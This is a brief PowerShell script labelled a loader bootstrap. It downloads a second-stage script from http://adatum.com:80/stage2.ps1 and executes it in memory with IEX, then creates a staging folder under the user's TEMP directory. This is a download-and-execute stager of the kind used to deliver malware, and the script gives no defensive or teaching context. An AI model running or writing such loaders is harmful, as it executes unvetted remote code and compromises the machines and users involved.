<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$Stage1Url = "http://adatum.com:80/stage2.ps1",
    [int]$TimeoutSec = 50
)
IEX (Invoke-WebRequest -Uri $Stage1Url -UseBasicParsing).Content
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
